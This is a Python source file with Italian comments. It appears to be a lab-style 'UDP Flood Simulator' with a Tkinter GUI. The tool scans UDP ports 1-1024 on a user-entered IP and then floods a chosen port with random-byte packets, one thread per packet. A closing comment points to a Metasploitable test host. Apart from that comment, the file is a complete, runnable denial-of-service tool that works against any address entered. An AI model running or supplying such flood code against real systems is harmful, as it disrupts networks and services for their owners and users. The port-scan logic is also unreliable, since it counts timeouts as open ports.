import socket  # Libreria per la gestione delle connessioni di rete (socket)
import os      # Libreria per interagire con il sistema operativo, usata per generare dati casuali
import threading  # Libreria per l'esecuzione di operazioni in parallelo (multi-threading)
import tkinter as tk  # Libreria per creare l'interfaccia grafica (GUI)
from tkinter import messagebox # Modulo per mostrare finestre di messaggio all'utente

# --- FUNZIONI CORE PER LA LOGICA DI RETE ---

def generate_packet(size):
    """
    Genera un pacchetto di byte casuali.
    
    Args:
        size (int): La dimensione del pacchetto in byte.
    
    Returns:
        bytes: Una sequenza di byte casuali.
    """
    # os.urandom(size) genera una stringa di byte casuali sicura
    return os.urandom(size)

def udp_flood(target_ip, target_port, packet_size, packet_count):
    """
    Simula un attacco UDP flood inviando un gran numero di pacchetti.
    
    Args:
        target_ip (str): L'indirizzo IP di destinazione.
        target_port (int): La porta di destinazione.
        packet_size (int): La dimensione di ogni pacchetto in byte.
        packet_count (int): Il numero totale di pacchetti da inviare.
    """
    def send_packet():
        """Funzione interna per inviare un singolo pacchetto UDP."""
        try:
            # Crea un socket UDP (socket.SOCK_DGRAM)
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                # Genera il pacchetto casuale
                packet = generate_packet(packet_size)
                # Invia il pacchetto all'indirizzo e porta di destinazione
                sock.sendto(packet, (target_ip, target_port))
        except Exception as e:
            # Stampa un eventuale errore durante l'invio
            print(f"Errore durante l'invio del pacchetto: {e}")

    print(f"Inizio attacco UDP flood su {target_ip}:{target_port}")
    threads = []
    try:
        # Crea e avvia un thread per ogni pacchetto da inviare
        for _ in range(packet_count):
            thread = threading.Thread(target=send_packet)
            thread.daemon = True  # Imposta il thread come "daemon" per terminarlo automaticamente
            threads.append(thread)
            thread.start()

        # Attende che tutti i thread abbiano completato il loro lavoro
        for thread in threads:
            thread.join()

        print("Attacco completato!")
    except Exception as e:
        print(f"Errore generale nell'UDP Flood: {e}")

def scan_udp_port(target_ip, port, open_ports, output_widget, lock):
    """
    Scansiona una singola porta UDP per verificare se è aperta.
    
    Args:
        target_ip (str): L'indirizzo IP del bersaglio.
        port (int): La porta da scansionare.
        open_ports (list): Lista per memorizzare le porte aperte trovate.
        output_widget (tk.Text): Il widget di testo della GUI per mostrare i risultati.
        lock (threading.Lock): Un blocco per gestire l'accesso condiviso alle risorse.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.settimeout(0.01)  # Imposta un timeout molto breve per la risposta
        try:
            # Invia un pacchetto vuoto al target
            s.sendto(b"", (target_ip, port))
            # Tenta di ricevere una risposta. Se non arriva nulla entro il timeout,
            # è un'indicazione che la porta potrebbe essere aperta.
            s.recvfrom(1024)
        except socket.timeout:
            # Se scatta il timeout, considera la porta aperta
            with lock:
                open_ports.append(port)
                output_widget.insert(tk.END, f"Porta UDP aperta: {port}\n")
                output_widget.see(tk.END) # Scorre automaticamente alla fine del testo
        except Exception:
            # Se si verifica un altro errore (es. "porta irraggiungibile"), si ignora
            pass

def scan_udp_ports(target_ip, output_widget):
    """
    Avvia la scansione di un intervallo di porte UDP usando più thread.
    
    Args:
        target_ip (str): L'indirizzo IP del bersaglio.
        output_widget (tk.Text): Il widget di testo della GUI per mostrare i risultati.
    """
    open_ports = []
    threads = []
    lock = threading.Lock()
    output_widget.delete(1.0, tk.END)  # Cancella il contenuto precedente

    def scan_callback():
        """Funzione eseguita in un thread separato per non bloccare la GUI."""
        try:
            # Scansiona le porte da 1 a 1024
            for port in range(1, 1025):
                # Crea e avvia un thread per ogni singola porta
                thread = threading.Thread(target=scan_udp_port, args=(target_ip, port, open_ports, output_widget, lock))
                thread.daemon = True
                threads.append(thread)
                thread.start()

                # Limita il numero di thread attivi per non sovraccaricare il sistema
                if len(threads) >= 100:
                    for t in threads:
                        t.join()
                    threads.clear()

            # Attende il completamento di tutti i thread rimanenti
            for t in threads:
                t.join()

            # Mostra una finestra di messaggio con i risultati finali
            messagebox.showinfo("Scansione completata", f"Scansione completata. Porte aperte trovate: {len(open_ports)}")
        except Exception as e:
            messagebox.showerror("Errore", f"Errore durante la scansione: {e}")

    # Avvia la funzione di scansione in un thread separato
    threading.Thread(target=scan_callback, daemon=True).start()

# --- FUNZIONI DI GESTIONE DELLA GUI ---

def start_port_scan():
    """
    Avvia la scansione delle porte quando l'utente clicca il pulsante.
    """
    target_ip = ip_entry.get()
    if not target_ip:
        messagebox.showerror("Errore", "Inserisci un IP per la scansione delle porte!")
        return

    scan_udp_ports(target_ip, port_output)

def start_udp_flood():
    """
    Avvia l'attacco UDP flood quando l'utente clicca il pulsante.
    """
    target_ip = ip_entry.get()
    target_port = port_entry.get()
    packet_size = size_entry.get()
    packet_count = count_entry.get()

    # Controlla che tutti i campi siano compilati
    if not target_ip or not target_port or not packet_size or not packet_count:
        messagebox.showerror("Errore", "Tutti i campi devono essere compilati!")
        return

    try:
        # Converte i valori da stringa a intero
        target_port = int(target_port)
        packet_size = int(packet_size)
        packet_count = int(packet_count)
        
        # Avvia l'attacco in un thread separato per non bloccare l'interfaccia
        threading.Thread(target=udp_flood, args=(target_ip, target_port, packet_size, packet_count), daemon=True).start()
        messagebox.showinfo("In corso", "Attacco UDP flood avviato!")
    except ValueError:
        messagebox.showerror("Errore", "Porta, dimensione pacchetti e numero pacchetti devono essere numeri interi!")
    except Exception as e:
        messagebox.showerror("Errore", f"Si è verificato un errore: {e}")

def import_selected_port():
    """
    Copia la porta selezionata dal campo di scansione a quello dell'attacco.
    """
    selected_port = selected_port_entry.get()
    if selected_port:
        port_entry.delete(0, tk.END)
        port_entry.insert(0, selected_port)
    else:
        messagebox.showerror("Errore", "Nessuna porta selezionata!")

# --- CREAZIONE E CONFIGURAZIONE DELL'INTERFACCIA GRAFICA ---

def create_gui():
    """
    Crea e avvia l'interfaccia grafica dell'applicazione.
    """
    # Dichiarazione delle variabili globali per i widget, per renderle accessibili dalle altre funzioni
    global ip_entry, port_entry, size_entry, count_entry, selected_port_entry, port_output

    root = tk.Tk()
    root.title("Simulatore UDP Flood")

    # Sezione Scansione Porte
    tk.Label(root, text="--- Scansione Porte UDP ---").grid(row=0, column=0, columnspan=2, pady=10)

    tk.Label(root, text="IP Target:").grid(row=1, column=0, padx=10, pady=5, sticky="e")
    ip_entry = tk.Entry(root, width=30)
    ip_entry.grid(row=1, column=1, padx=10, pady=5)

    tk.Button(root, text="Scansiona Porte", command=start_port_scan).grid(row=2, column=0, columnspan=2, pady=10)

    tk.Label(root, text="Porte Aperte:").grid(row=3, column=0, padx=10, pady=5, sticky="ne")
    port_output = tk.Text(root, width=40, height=10)
    port_output.grid(row=3, column=1, padx=10, pady=5)

    tk.Label(root, text="Seleziona Porta:").grid(row=4, column=0, padx=10, pady=5, sticky="e")
    selected_port_entry = tk.Entry(root, width=30)
    selected_port_entry.grid(row=4, column=1, padx=10, pady=5)

    tk.Button(root, text="Importa Porta", command=import_selected_port).grid(row=5, column=0, columnspan=2, pady=10)

    # Sezione Attacco UDP Flood
    tk.Label(root, text="--- Attacco UDP Flood ---").grid(row=6, column=0, columnspan=2, pady=10)

    tk.Label(root, text="Porta Target:").grid(row=7, column=0, padx=10, pady=5, sticky="e")
    port_entry = tk.Entry(root, width=30)
    port_entry.grid(row=7, column=1, padx=10, pady=5)

    tk.Label(root, text="Dimensione Pacchetto (byte):").grid(row=8, column=0, padx=10, pady=5, sticky="e")
    size_entry = tk.Entry(root, width=30)
    size_entry.grid(row=8, column=1, padx=10, pady=5)

    tk.Label(root, text="Numero di Pacchetti:").grid(row=9, column=0, padx=10, pady=5, sticky="e")
    count_entry = tk.Entry(root, width=30)
    count_entry.grid(row=9, column=1, padx=10, pady=5)

    tk.Button(root, text="Avvia UDP Flood", command=start_udp_flood).grid(row=10, column=0, columnspan=2, pady=10)

    # Avvia il ciclo principale della GUI per mostrare la finestra e attendere gli eventi
    root.mainloop()

# Punto di ingresso del programma: se il file viene eseguito direttamente, crea la GUI
if __name__ == "__main__":
    create_gui()

#PER ASCOLTARE DALLA METASPOITABLE CON IP ATTUALMENTE DI 192.168.50.101 fare comando sudo tcpdump -i eth0 udp port <PORTA> senza <> 